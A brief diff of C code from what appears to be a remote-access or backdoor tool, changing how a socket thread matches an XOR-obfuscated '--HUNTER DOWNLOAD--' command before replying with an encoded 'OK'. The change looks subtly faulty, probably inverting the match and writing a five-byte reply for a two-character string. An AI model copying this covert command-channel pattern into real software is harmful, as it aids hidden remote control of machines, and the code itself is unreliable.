@@ -108,7 +108,7 @@ void *Socket_Reader(){
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
 
 	xorbuffer = XOR(buffer, key, n, keylen);
-	if(strcmp(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
+	if(str_starts_with(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
 		char* xorconfirm = XOR("OK", key, 5, keylen);
 		write(a.dest, xorconfirm, 5);
 		free(xorconfirm);
